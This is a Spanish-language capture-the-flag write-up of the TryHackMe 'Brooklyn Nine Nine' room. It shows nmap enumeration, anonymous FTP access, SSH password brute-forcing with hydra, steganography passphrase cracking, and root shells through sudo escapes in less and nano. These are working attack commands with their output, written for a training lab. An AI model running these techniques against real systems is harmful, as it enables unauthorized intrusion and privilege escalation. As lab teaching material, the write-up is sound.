---
title: Try Hack Me - Brooklyn Nine Nine - Writeup
date: 2022-08-16 09:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a trabajar con la máquina [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine) disponible en [THM](https://tryhackme.com), un sencillo CTF creado por [Fsociety2006](https://tryhackme.com/p/Fsociety2006) en el que pondremos en práctica técnicas de enumeración, esteganografía y escalado de privilegios entre otras curiosidades.

Dentro música.

## Inicio

> **Disclaimer:** algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.

Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.

```console
┌──(ewan67㉿kali)-[~]
└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
```

Iniciamos la máquina remota dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>

Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:

```console
┌──(ewan67㉿kali)-[~]
└─$ cd Cybersecurity/THM

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ mkdir BrooklynNineNine

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ cd BrooklynNineNine

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ touch notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ echo "Notas BrooklynNineNine" > notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ cat notas
Notas BrooklynNineNine
```

## Reconocimiento & Enumeración

En el subtítulo del room nos comentan que hay dos vías de resolver la máquina. Puestos a practicar, en esta guía abordaremos ambas.

Empezamos enumerando con **nmap** como punto de partida común.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ nmap -A 10.10.190.53 -oN nmap_output
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ nmap -A 10.10.190.53 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 19:13 CEST
Nmap scan report for 10.10.190.53
Host is up (0.077s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.69 seconds
```

Tenemos tres puertos abiertos:

* *21/tcp* con un servicio ftp escuchando
* *22/tcp* con un servicio ssh escuchando
* *80/tcp* con un servicio http escuchando

El volcado de **nmap** nos cuenta que el servidor FTP soporta login anónimo. Vamos a por ello.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ ftp 10.10.190.53
Connected to 10.10.190.53.
220 (vsFTPd 3.0.3)
Name (10.10.190.53:ewan67): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||17845|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||50254|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*************************************************************************************************************************|   119        1.66 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (1.08 KiB/s)
ftp> exit
221 Goodbye.
```

Abrimos el fichero que acabamos de descargarnos y nos encontramos una nota de *Amy* para *Jake* solicitándole que cambie su contraseña para que no se enfade *Holt*. Tres usuarios.

Vamos a probar con **hydra** contra el servicio ssh utilizando el usuario *jake* y *rockyou.txt* como diccionario a ver si conseguimos algo. Para empezar, localizamos el diccionario en nuestro equipo.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ locate rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt
```

Y lanzamos **hydra**:

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.190.53:22  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-16 19:31:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.190.53:22/
[22][ssh] host: 10.10.190.53   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-16 19:32:18
```

Significado de las flags:

* `-l`&nbsp;: usuario para el que queremos encontrar la contraseña.
* `-P`&nbsp;: el diccionario que vamos a utilizar.

Con la contraseña de *jake* nos logamos via ssh.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ ssh jake@10.10.190.53
jake@10.10.190.53's password: 
Last login: Tue Aug 16 17:33:50 2022 from 10.18.34.64
jake@brookly_nine_nine:~$ cd /home
jake@brookly_nine_nine:/home$ ls -la
total 20
drwxr-xr-x  5 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
jake@brookly_nine_nine:/home$ cd amy
jake@brookly_nine_nine:/home/amy$ ls -la
total 32
drwxr-xr-x 5 amy  amy  4096 May 18  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw-r--r-- 1 amy  amy   220 May 17  2020 .bash_logout
-rw-r--r-- 1 amy  amy  3771 May 17  2020 .bashrc
drwx------ 2 amy  amy  4096 May 18  2020 .cache
drwx------ 3 amy  amy  4096 May 18  2020 .gnupg
-rw-r--r-- 1 amy  amy   807 May 17  2020 .profile
drwx------ 2 amy  amy  4096 May 17  2020 .ssh
jake@brookly_nine_nine:/home/amy$ cd /home/holt
jake@brookly_nine_nine:/home/holt$ ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Tenemos la primer flag. Vamos a por root.

## Escalado de privilegios

Lo primero es chequear los binarios que *jake* puede ejecutar con privilegios de root.

```
[...]
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/home/holt$
```

Bien, podemos ejecutar el binario *less* con *sudo* sin siquiera teclear nuestra contraseña.

Nos vamos a [GTFOBins](https://gtfobins.github.io/), buscamos por *less* y le damos a la cajita que pone *sudo*.

![](/assets/posts/20220810/img18.png)

OK. Toca probar.

```
[...]
jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile

# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi
/etc/profile (END)         # aqui mismo pegamos el segundo comando !/bin/sh y damos a Enter

jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
# 
# whoami
root
# ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
# cd /root
# ls -la
total 32
drwx------  4 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 17  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 18  2020 .ssh
-rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
-rw-r--r--  1 root root  135 May 18  2020 root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Enjoy!!
# 
```

Bien, flag de root conseguida, room resuelto. Pero como mencionamos al principio, este CTF nos propone dos vías de resolverlo. Hasta aqui hemos seguido la ruta FTP + Hydra + SSH + Escalado de privilegios. Veamos ahora qué da de si el puerto 80 que tenemos abierto.

## Segunda vía

Cargamos la IP del server en el navegador. El site nos muestra una imagen con un texto al pie. Echamos un ojo al código fuente y nos encontramos el siguiente comentario:

```
<!-- Have you ever heard of steganography? -->
```

Todo apunta a que la imagen que da vida al site tiene *algo* oculto mediante esteganografía.

Descargamos la imagen a nuestra carpeta de trabajo y le damos cariño con **steghide**

> **Tip:** si intentamos descargar la imagen dando al boton derecho del ratón no veremos la opción *Save Image As...* pues la imagen se ha cargado via CSS. Toca abrirla en otra pestaña para poder hacerlo mediante ese método. Otra opción: `wget http://10.10.190.53/brooklyn99.jpg`

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ steghide --info brooklyn99.jpg
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

Malo. Nos pide una passphrase para extraer la información. Tiramos de **stegcracker**.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ stegcracker brooklyn99.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20267 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

**stegcracker** ha hecho dos cosas: averiguar la passphrase y extraernos el fichero oculto en la imagen con el nombre *brooklyn99.jpg.out* en nuestro directorio de trabajo.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

OK. Tenemos la contraseña del usuario *Holt*.

Otra posibilidad habría sido extraerlo con **steghide** utilizando la passphrase que nos aportó **stegcracker**.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ steghide extract -sf brooklyn99.jpg
Enter passphrase: 
wrote extracted data to "note.txt".

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ cat note.txt
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Vamos por ssh con el usuario *holt*.

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ ssh holt@10.10.190.53              
holt@10.10.190.53's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
holt@brookly_nine_nine:~$ cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$ 
```

En este caso, el binario que podemos explotar es *nano*. Volvemos a [GTFOBins](https://gtfobins.github.io/).

![](/assets/posts/20220810/img19.png)

Vamos a ello:

* ejecutamos `sudo nano`&nbsp; en el terminal

```
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]
└─$ holt@brookly_nine_nine:~$ sudo nano
```

* se nos abre el editor *GNU nano 2.9.3*
* le damos a Ctrl + r y a continuación a Ctrl + x

![](/assets/posts/20220810/img20.png)

* a continuación de *Command to execute:* pegamos la última parte del comando `reset; sh 1>&0 2>&0`&nbsp; y damos a Enter

* nos aparece `#`&nbsp; al final del comando anterior (somos root)

* tecleamos `clear`&nbsp; + Enter. Se nos limpia el terminal y nos queda solo la almohadilla.

```
# 
# whoami
root
# cd /root
# ls -la     
total 32
drwx------  4 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 17  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 18  2020 .ssh
-rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
-rw-r--r--  1 root root  135 May 18  2020 root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Enjoy!!
# 
```

Otra opción a lo anterior, una vez que tenemos la `#`&nbsp; de root, es dar varias veces al Enter:

![](/assets/posts/20220810/img21.png)

Esto va en gustos.

Pues hasta aquí la guía para resolver el room. Espero que os haya resultado útil.

Saludos.